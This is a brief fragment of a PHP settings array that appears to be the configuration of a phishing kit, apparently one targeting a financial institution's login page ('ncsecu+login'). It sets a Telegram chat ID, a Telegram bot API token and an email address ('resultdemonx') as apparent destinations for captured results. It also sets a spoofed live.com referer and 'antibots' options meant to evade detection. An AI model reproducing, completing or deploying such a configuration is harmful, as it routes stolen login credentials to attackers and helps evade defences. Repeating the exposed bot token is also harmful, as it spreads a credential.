...
$settings = array(
    ...
    "chat_id"		=> "5347955583",	// Chat ID Of You
	"bot_url"		=> "bot5418539261:AAHBVggfQCIKsjql0fNG7bC91EOLzFBBeqI",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"email"			=> "resultdemonx@yandex.com",	// Your E-Mail

    "referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "ncsecu+login",	// Outcome Of AntiBots Forward - DONT CHANGE
